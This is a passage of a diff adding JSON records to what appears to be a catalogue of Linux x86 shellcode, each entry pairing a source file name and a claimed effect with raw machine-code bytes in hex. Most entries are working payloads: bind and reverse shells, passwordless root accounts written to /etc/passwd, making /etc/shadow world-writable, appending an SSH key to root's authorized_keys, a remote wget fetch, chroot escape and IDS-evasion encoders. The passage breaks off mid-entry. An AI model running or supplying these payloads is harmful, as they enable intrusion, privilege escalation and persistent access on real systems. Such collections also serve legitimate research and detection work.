+    "bytes_hex": "eb115e31c9b137806c0eff1380e90175f6eb05e8eaffffff44eec32ae09344d3637b7477828a7b7642867b7b424278879cf679ccc914c322e09353e093",
+    "claimed_effect": "Polymorphic",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Polymorphic_bindport_to_13123.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 125,
+    "bytes_hex": "eb115e31c9b165806c0eff3580e90175f6eb05e8eaffffff66f566106607859f369f37be1633f8e59b02b5befb879df0376878be169f45868bbe1633f8e59b02b5878bbe16e839e59b02b587878bbe1633f8e59b02b5bef866fee57402b576e57402b576e57402b5879d6464a89d9d64979ea3be188788be16e54002b5",
+    "claimed_effect": "Polymorphic bindport to 13123",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Polymorphic_bindport_to_31337_with_setreuid_(0,0).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 131,
+    "bytes_hex": "eb115e31c9b16b806c0eff3580e90175f6eb05e8eaffffffe57bbd0e02b566f566106607859f369f37be1633f8e59b02b5befb879df037af9ebe169f45868bbe1633f8e59b02b5878bbe16e839e59b02b587878bbe1633f8e59b02b5bef866fee57402b576e57402b576e57402b5879d6464a89d9d64979ea3be188788be16e54002b5",
+    "claimed_effect": "Polymorphic bindport to 31337 with setreuid (0,0)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Polymorphic_shellcode_for_disable_Network_Card.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 75,
+    "bytes_hex": "eb115e31c9b151806c0eff0180e90175f6eb05e8eaffffff6b0c599a53696570786f8ae75369667569318ae253696f676a68696a676470696a6f303069303074638ae4535752548ae2ce81",
+    "claimed_effect": "Polymorphic shellcode for disable Network Card",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Port_Bind_4444_(_xor-encoded_).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 142,
+    "bytes_hex": "eb125b31c9b1758a03341e880343664975f5eb05e8e9ffffff747846741f452fd74f741f741c97ffd39e97d82fcc4c78760f4278761c1e97ff740e4f4e97ffad1c747846d39eae78ad1ad39e4c4897ff5d747846d39e97dd741c47742146d39efce7742146d39e2fcc4c7670316d767631317c7797fd4c7876337797ff4c4f4d97ff741546d39e741f462fc5d39e",
+    "claimed_effect": "Port Bind 4444 ( xor-encoded )",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Push_Reboot().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 30,
+    "bytes_hex": "31c05068626f6f74686e2f7265682f73626989e35089e25389e1b00bcd80",
+    "claimed_effect": "Push Reboot()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/ROT-7_Decoder_execve.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 74,
+    "bytes_hex": "eb255e31c9b11e803e077c05802e07eb1131db31d2b307b2ff66422a1e6629da881646e2e2eb05e8d6ffffff38c7576f69687a6f6f697075366f3636363690ea5790e95a90e8b712d487",
+    "claimed_effect": "ROT-7 Decoder execve",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Radically_Self_Modifying_Code.c",
+    "bucket": "other",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Radically Self Modifying Code",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/Remote_Port_forwarding.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 87,
+    "bytes_hex": "31c050682e32323668382e303068322e31366668313989e65068743a3232686c686f73686c6f6361683939393a6668303989e55066682d5289e750682f737368682f62696e682f75737289e3505655575389e1b00bcd80",
+    "claimed_effect": "Remote Port forwarding",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Remote_file_Download.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 42,
+    "bytes_hex": "6a0b589952686161616189e1526a74682f776765682f62696e682f75737289e352515389e1cd8040cd80",
+    "claimed_effect": "Remote file Download",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Reverse_TCP_bind_shell.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 32,
+    "bytes_hex": "31c031db31c931d2b066b301516a066a016a0289e1cd8089c6b06631dbb30268",
+    "claimed_effect": "Reverse TCP bind shell",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Reverse_Telnet.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 56,
+    "bytes_hex": "eb315e89764f8d5e08895e538d5e0b895e5731c088460788460a88464e89465bb00b89f38d4e4f8d565bcd8031db89d840cd80e8caffffff",
+    "claimed_effect": "Reverse Telnet",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/SET_IP()_Connectback_Shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 82,
+    "bytes_hex": "6a66586a015b31c9516a016a0289e1cd80687f7f7f7f6668fcc9666a0289e16a10515089e189c66a035b6a6658cd8087f36a0259b03fcd804979f9b00b31d252682f2f7368682f62696e89e3525389e1cd80",
+    "claimed_effect": "SET IP() Connectback Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/SET_PORT()_portbind.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 100,
+    "bytes_hex": "6a66586a015b31c9516a016a0289e1cd8031d2526668fcc9666a0289e16a10515089e189c66a025b6a6658cd806a66586a045bcd8031c951515689e16a055b6a6658cd80936a0259b03fcd804979f9b00b52682f2f7368682f62696e89e3525389e1cd80",
+    "claimed_effect": "SET PORT() portbind",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/SLoc-DoS_shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 55,
+    "bytes_hex": "eb255b31c031c931d289430bb00acd80eb085b895308b00bcd80e8f3ffffff706f7765726f6666e8d6ffffff2f6574632f736861646f77",
+    "claimed_effect": "SLoc-DoS shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/SWAP_restore.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 109,
+    "bytes_hex": "6a055899526873646131686465762f66682f2f89e35259cd809331c96a135866b9697acd8089e142c1e20a426a0358cd8089e69931ffac38d0740447ebf8916a0658cd8089e666b9410452682f737772682f746d7089e3b005cd80936a0458565989facd80b006cd80b001cd80",
+    "claimed_effect": "SWAP restore",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/SWAP_store.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 99,
+    "bytes_hex": "6a055899526873646131686465762f66682f2f89e36a0159cd80974952682f737773682f746d7089e36a0558cd809389e142c1e20a6a0358cd80966a0658cd809231c96a135889fb66b9697acd808914346a04585459565a42cd80b006cd80b001cd80",
+    "claimed_effect": "SWAP store",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Search_php,html_writable_files_and_add_your_code.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 423,
+    "bytes_hex": "31c05083ec01c604242f89e3b00ccd8031c05083ec01c604242eeb02eb63e8f9ffffff31c031dbb001cd8031c089fb31c9b102b005cd8031db89c331c931c099b202b013cd8031c089f1b22bb004cd8031c0b006cd80c331c031db31c999428a1c1784db741a3a1e75f48a040e8a1c1784c07408414238c374f0eb0431c0b002c35589e5b0fa29c431c031c98d5d08b005cd8085c0782289450c8b750c89f331c031c98d4c2464b059cd8085c0751931c031db89f3b006cd8031c05066682e2e89e3b00ccd80c9c38d54246e813a70726f6374c6803a2e7505e9bcffffff89d389e131c0b0c4cd8066b9ffef66bbff9f41438b4424106621c86639d87505e997ffffff31c05083ec01c604242e89d3b00ccd8085c0750ae865ffffffe979ffffff31c089d331c9b102b021cd8085c07405e964ffffff31c0506868746d6c83ec01c604242e89e689d7e809ffffff3c02741831c050682e70687089e6e8f6feffff3c027405e930ffffffeb0b5ee8b9feffffe923ffffffe8f0ffffff3c68746d6c3e3c7363726970743e616c657274282270776e336422293c7363726970743e3c2f68746d6c3e",
+    "claimed_effect": "Search php,html writable files and add your code",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Self-modifying_ShellCode_for_IDS_evasion.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 64,
+    "bytes_hex": "eb1c5a89d68b02663dca7d7506660503038902fec23d4141414175e9ffe6e8dfffffff31d26a0b589952682f2f7368682f62696e89e3525389e1ca7d41414141",
+    "claimed_effect": "Self-modifying ShellCode for IDS evasion",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Set_-proc-sys-net-ipv4-ip_forward_to_0_&_exit().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 83,
+    "bytes_hex": "31c0506877617264685f666f7268342f6970682f697076682f6e6574687379732f68726f632f66682f7089e331c9b101b005cd8089c331c9516a3089e131d2b201b004cd8031c083c006cd8031c04031dbcd80",
+    "claimed_effect": "Set -proc-sys-net-ipv4-ip forward to 0 & exit()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Shell_Bind_TCP_(GetPC-Call-Ret_Method).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 89,
+    "bytes_hex": "e8ffffffffc35d8d6d4a31c0996a015b52536a02ffd5965b5266682b67665389e16a105156ffd543435256ffd543525256ffd59359b03fcd804979f9b00b52682f2f7368682f62696e89e35253eb045f6a665889e1cd8057c3",
+    "claimed_effect": "Shell Bind TCP (GetPC-Call-Ret Method)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Shell_Bind_TCP_Random_Port.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 65,
+    "bytes_hex": "6a6658996a015b52536a0289e1cd8089c65fb066b304525689e1cd80b0664389542408cd809359b03fcd804979f9b00b52682f2f7368682f62696e89e35253ebca",
+    "claimed_effect": "Shell Bind TCP Random Port",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Shell_Bind_TCP_Shellcode_Port_1337.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 89,
+    "bytes_hex": "6a66586a015b31f656536a0289e1cd805f9793b0665666680539665389e16a10515789e1cd80b066b304565789e1cd80b0664356565789e1cd805959b10293b03fcd804979f9b00b682f2f7368682f62696e89e34189cacd80",
+    "claimed_effect": "Shell Bind TCP Shellcode Port 1337",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Shell_Reverse_TCP_Shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 72,
+    "bytes_hex": "687f0101015e6668d9035f6a6658996a015b52536a0289e1cd809359b03fcd804979f9b066566657666a0289e16a10515389e1cd80b00b52682f2f7368682f62696e89e35253ebce",
+    "claimed_effect": "Shell Reverse TCP Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Shellcode_Polymorphic_chmod(-etc-shadow)_&_exit().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 54,
+    "bytes_hex": "eb115e31c9b130806c0eff2380e90175f6eb05e8eaffffff7489dcd9248b8487929a8b8652968b8b52528897ac068d327bf0a363f0a3",
+    "claimed_effect": "Shellcode Polymorphic chmod(-etc-shadow) & exit()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Shutdown_computer.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 51,
+    "bytes_hex": "6a0b5899526a7766686e6f89e65266682d6889e15268646f776e687368757468696e2f2f682f2f736289e35256515389e1cd80",
+    "claimed_effect": "Shutdown computer",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Surprise_!_!_!.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 361,
+    "bytes_hex": "31f66a0258cd8085c075785689e289e180ea0c89d4566a626668782f684c696e75686f72672f686f726d2e686c2d7374687368656c6865706f2e683a2f2f72686874747089e389e289cc5389e189d45666682d7189e389e289cc5389e189d4566a74682f776765682f62696e682f75737289e389e289cc5389e189d46a0b5831d2cd806a075831db4b31c931d2cd806a0b5f6a0258cd8085c0757331f65689e289e180ea1489d4566a6289e389e289cc5389e189d4566a30683930303089e389e289cc5389e189d45666682d7289e389e289cc5389e189d45666682d7189e389e289cc5389e189d45666686179682f61706c682f62696e682f75737289e389e289cc5389e189d46a0b5831d2cd806a075831db4b31c931d2cd804f85ff0f856fffffff5689e289e180ea0c89d4566a6289e389e289cc5389e189d45666682d6689e389e289cc5389e189d4566a6d66682f72682f62696e89e389e289cc5389e189d46a0b5831d2cd80",
+    "claimed_effect": "Surprise ! ! !",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/SystemV_killall_command.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 34,
+    "bytes_hex": "31c05066686c35686c6c616c686e2f6b69682f73626989e35089e25389e1b00bcd80",
+    "claimed_effect": "SystemV killall command",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/System_Beep.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 45,
+    "bytes_hex": "6a055899526874793130682f2f2f74682f64657689e389d1cd8089c36a3658b9cfb4fffff7d1badc34fa03cd80",
+    "claimed_effect": "System Beep",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/TCP_bind_shell.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 32,
+    "bytes_hex": "31c031db31c931d2b066b301516a066a016a0289e1cd8089c6b066b302526668",
+    "claimed_effect": "TCP bind shell",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Tiny_Execve_sh_Shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 21,
+    "bytes_hex": "31c9f7e1b00b51682f2f7368682f62696e89e3cd80",
+    "claimed_effect": "Tiny Execve sh Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Tiny_Shell_Bind_TCP.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 73,
+    "bytes_hex": "31dbf7e3b0664352536a0289e1cd805b5e5266682b676a105150b06689e1cd80895104b066b304cd80b06643cd8059936a3f58cd804979f8b00b682f2f7368682f62696e89e341cd80",
+    "claimed_effect": "Tiny Shell Bind TCP",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Tiny_Shell_Bind_TCP_Random_Port.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 57,
+    "bytes_hex": "31dbf7e3b0664352536a0289e1cd80525089e1b066b304cd80b06643cd8059936a3f58cd804979f8b00b682f2f7368682f62696e89e341cd80",
+    "claimed_effect": "Tiny Shell Bind TCP Random Port",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Tiny_Shell_Reverse_TCP.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 67,
+    "bytes_hex": "31dbf7e3b0664352536a0289e1cd805993b03fcd804979f9b066687f01010166682b67666a0289e16a10515389e1cd80b00b52682f2f7368682f62696e89e331c9cd80",
+    "claimed_effect": "Tiny Shell Reverse TCP",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Tiny_read_-etc-passwd_file.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 51,
+    "bytes_hex": "31c9f7e1b00551687373776468632f7061682f2f657489e3cd809391b00331d266baff0f42cd809231c0b004b301cd8093cd80",
+    "claimed_effect": "Tiny read -etc-passwd file",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Write_FS_PHP_Connect_Back_Utility_Shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 506,
+    "bytes_hex": "68706870ff682f63622e682f777777682f76617231c089e688460f89e331c9b14231d2b2ff31c0b005cd8031db88c3683f3effff683b7d207d6824722929686c656e286820737472682024722c686f636b2c68652824736877726974686b65745f683b736f636831242022687375312e685c6e6362682e3d202268603b24726820602469682472203d683029297b682c20313068736f636b686164282468745f7265686f636b656824693d7368696c652868293b776868222c3130687465643a686e6e6563682022436f686f636b2c68652824736877726974686b65745f683b736f63686f727429682c2024706872657373682461646468636b2c20682824736f686e656374685f636f6e68636b657468293b736f685f544350682c534f4c685245414d684b5f5354682c534f4368494e4554682841465f686561746568745f6372686f636b6568636b3d73683b24736f687274275d685b27706f685f4745546872743d24683b24706f6874275d296827686f73684745545b686528245f68796e616d686f7374626867657468686573733d68616464726873657b24683b7d656c68342e22296872203430684572726f686e742822687b7072696874275d296827706f72684745545b682621245f6874275d266827686f73684745545b682821245f6850206966683c3f504831c089e6b00489e166ba6201cd80",
+    "claimed_effect": "Write FS PHP Connect Back Utility Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/add_a_passwordless_local_root_account_w000t.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 137,
+    "bytes_hex": "eb2a5e31c088460788460a8846478976498d5e08895e4d8d5e0b895e51894655b00b89f38d4e498d5655cd80e8d1ffffff2f62696e2f7368232d63232f62696e2f6563686f2077303030743a3a303a303a733466656d3064653a2f726f6f743a2f62696e2f62617368203e3e202f6574632f7061737377642341414141424242424343434344444444",
+    "claimed_effect": "add a passwordless local root account w000t",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/add_root_user_(r00t)_with_no_password_to_-etc-passwd.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 69,
+    "bytes_hex": "6a055831c9516873737764682f2f7061682f65746389e366b90104cd8089c36a045831d25268303a3a3a683a3a303a687230307489e16a0c5acd806a0658cd806a0158cd80",
+    "claimed_effect": "add root user (r00t) with no password to -etc-passwd",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/add_user_t00r_ENCRYPT.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 116,
+    "bytes_hex": "eb1b5f31c06a286a5259495b8a040ff6d330d888040f5085c975efeb05e8e0ffffff0e6fc7e4fffbecf3f4b3a0eef6b8ffb5ee0295913ab57032ba37b2f6b5bbb20407865c21b22ec6f9bea3e4ffadeab2f4fea7f5ffeab8adfff5f5ade3bbffbd3f596633ba7297d3b24e0e8f4934b23f72b257",
+    "claimed_effect": "add user t00r ENCRYPT",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/adds_a_root_user_no-passwd_to_-etc-passwd.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 83,
+    "bytes_hex": "31c031db31c953687373776468632f7061682f2f657489e366b90104b005cd8089c331c031d2686e2f7368682f2f6269683a3a2f3a683a303a3068626f623a89e1b214b004cd8031c0b006cd8031c0b001cd80",
+    "claimed_effect": "adds a root user no-passwd to -etc-passwd",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/alpha-numeric.c",
+    "bucket": "other",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "alpha-numeric",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/alphanumeric_Bomb_FORK_Shellcode.c",
+    "bucket": "ascii",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 117,
+    "bytes_hex": "4c4c4c4c6841474958583541474958485a545950515250545552576149684956524549303966684554665a303149303966685542665a303149303966683636665a303149686a756e6b303966687459665a30314966683636665a30314966686f77665a303154565930797466686570665a3071744c",
+    "claimed_effect": "alphanumeric Bomb FORK Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/anti-debug_trick_(INT_3h_trap)_execve(-bin-sh,_[-bin-sh,_NULL],_NULL).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 39,
+    "bytes_hex": "6a30586a055beb0559cd80cc40e8f6ffffff99b00b52682f2f7368682f62696e89e3525354ebe1",
+    "claimed_effect": "anti-debug trick (INT 3h trap) execve(-bin-sh, [-bin-sh, NULL], NULL)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/append_-etc-passwd_&_exit().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 107,
+    "bytes_hex": "eb385e31c088460b88462bc6462a0a8d5e0c895e2c8d1e66b9420466baa401b005cd8089c331d28b4e2cb21fb004cd80b006cd80b00131dbcd80e8c3ffffff2f6574632f70617373776423746f6f723a3a303a303a743030723a2f726f6f743a2f62696e2f626173682023",
+    "claimed_effect": "append -etc-passwd & exit()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/append_rsa_key_to_-root-.ssh-authorized_keys2.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 295,
+    "bytes_hex": "31d25268657973326865645f6b686f72697a6861757468687373682f68742f2f2e682f726f6f89e366b941046a0558cd809389e631d2526a0a6820787878683135544a6856394857686d752b38683135643168642f716968524b6179687070796e683546316d6855645a35684d2b4c63683859416d684d425079684c444d586841343138686533764d68486f787768346d46366848396f39685659486a684b41746d68707a647168502b764d686c4751436850684f32684d37483568766b6c476837744f356854636e776836637765686d626471684e3275706874736a58684147454168497741416841414142686332454168614331796842334e7a68414141416872736120687373682d89e1b2a96a0458cd8034afcd80040f89f366b98001cd806a0158cd80",
+    "claimed_effect": "append rsa key to -root-.ssh-authorized keys2",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/back-connect_TCP-2222.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 94,
+    "bytes_hex": "eb565e31c0c646010266c74602ae08c74604c32e40286a066a016a02b06150cd8089c26a108d06505231c0b06250cd80b103bbffffffff435352b05a50cd80e0f631c050682f2f7368682f62696e89e2505452b03b50cd80e8a5ffffff41",
+    "claimed_effect": "back-connect TCP-2222",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/bin-cat_-etc-passwd.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 43,
+    "bytes_hex": "31c09952682f636174682f62696e89e3526873737764682f2f7061682f65746389e1b00b52515389e1cd80",
+    "claimed_effect": "bin-cat -etc-passwd",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/bind_port_to_6678_XOR_encoded_polymorphic.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 125,
+    "bytes_hex": "eb115e31c9b16580740eff0a80e90175f6eb05e8eaffffff3bca3bd13bd85a600b600883ebf4c9ba6cc78a83cc5862b108107083eb601a5b5c83ebf4c9ba6cc78a585c83ebb90eba6cc78a58585c83ebf4c9ba6cc78a83c93bc3ba35c78a4bba35c78a4bba35c78a586225257962622568636483e9585983ebba01c78a",
+    "claimed_effect": "bind port to 6678 XOR encoded polymorphic",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/bind_sh@64533.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 97,
+    "bytes_hex": "6a666a015b5899526a016a0289e1cd8089c66a665843526668fc15665389e16a10515689e1cd806a665843436a0556cd806a66584352525689e1cd8089c36a3f5831c9cd806a3f5841cd8031c050682f2f7368682f62696e89e39950b00b59cd80",
+    "claimed_effect": "bind sh@64533",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/break_chroot_execve_-bin-sh.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 71,
+    "bytes_hex": "31c031db31c9b017cd80eb365e88460a8d5e05b1edb027cd8031c0b03dcd8083c302b00ccd80e0fab03dcd8089760831c088460789460c89f38d4e0889c2b00bcd80e8c5ffffff",
+    "claimed_effect": "break chroot execve -bin-sh",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/cdrom_ejecting_shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 46,
+    "bytes_hex": "6a0b5899526a6d686364726f89e15266686374682f656a65682f62696e682f75737289e352515389e1cd8040cd80",
+    "claimed_effect": "cdrom ejecting shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/chmod()_-etc-shadow_666_&_exit().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 30,
+    "bytes_hex": "5166b9b6016861646f7768632f7368682f2f657489e36a0f58cd8040cd80",
+    "claimed_effect": "chmod() -etc-shadow 666 & exit()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/chmod(--bin-sh_,04775);_set_sh_+s.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 31,
+    "bytes_hex": "31c031db31c953686e2f7368682f2f626989e366b9fd09b00fcd80b001cd80",
+    "claimed_effect": "chmod(--bin-sh ,04775); set sh +s",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/chmod(-etc-shadow,_0666).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 36,
+    "bytes_hex": "eb125b31c031c931d2b1b6b501b00f89530bcd80e8e9ffffff2f6574632f736861646f77",
+    "claimed_effect": "chmod(-etc-shadow, 0666)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/chmod(-etc-shadow,_0666)_&_exit().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 33,
+    "bytes_hex": "31c0506861646f77682f2f7368682f65746389e36668b60159b00fcd80b001cd80",
+    "claimed_effect": "chmod(-etc-shadow, 0666) & exit()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/chmod(-etc-shadow,_0666)_ASCII.c",
+    "bucket": "empty",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "chmod(-etc-shadow, 0666) ASCII",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/chmod(-etc-shadow,_0777).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 33,
+    "bytes_hex": "31c050b00f6861646f7768632f7368682f2f657489e331c966b9ff01cd8040cd80",
+    "claimed_effect": "chmod(-etc-shadow, 0777)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/chmod_+_Add_new_root_user_with_password_+_exec_sh.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 378,
+    "bytes_hex": "31c031db6a0f58686a7377645bc1eb0853682f706173682f65746389e3684141ff0159c1e908c1e908cd806a0f58686a646f775bc1eb0853682f736861682f65746389e3684141ff0159c1e908c1e908cd806a055868417377645bc1eb0853682f706173682f65746389e3684141010459c1e908c1e908cd8089c36a0458684173680a59c1e90851686e2f6261683a2f626968726f6f74684c493a2f683a303a41684b2e3a3068667755576868703150687a5965416841614151684938757468504d5968685442747a68512f38546845366d676876502e73684e58523768394b554868722f59426856784b47683955665a6846566a6868466338796870596a716877695368686e54675468584d6937682f416e246870556e4d682436246a68414c493a89e1ba4141417fc1ea08c1ea08c1ea08cd8031c0b04631db31c9cd8031c0b04631db31c9cd8068595959596858585858682f736842682f62696e89e331c0884307895b0889430cb00b8d4b088d530ccd80b001b301cd80",
+    "claimed_effect": "chmod + Add new root user with password + exec sh",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/chmod_0777_-etc-shadow_(a_bit_obfuscated)_Shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 51,
+    "bytes_hex": "89c331d850be3e1f3a5681c623453521897424fcc74424f82f2f7368c74424f42f65746383ec0c89e36668ff016659b00fcd80",
+    "claimed_effect": "chmod 0777 -etc-shadow (a bit obfuscated) Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/chmod_666_-etc-passwd_&_-etc-shadow.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 57,
+    "bytes_hex": "31c066b9b601506873737764682f2f7061682f65746389e3b00fcd8031c0506861646f77682f2f7368682f65746389e3b00fcd8031c040cd80",
+    "claimed_effect": "chmod 666 -etc-passwd & -etc-shadow",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/chmod_666_-etc-shadow.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "chmod 666 -etc-shadow",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/chmod_666_shadow_ENCRYPT.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 75,
+    "bytes_hex": "eb1b5f31c06a536a2959495b8a040ff6d330d888040f5085c975efeb05e8e0ffffff03b69007be39ba796c8720f048cf0e8f403db24e0e7f72b297f3e4ffff2fb5eee8b3a3e4f6faf4e7db",
+    "claimed_effect": "chmod 666 shadow ENCRYPT",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/chroot()-execve()_code.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 71,
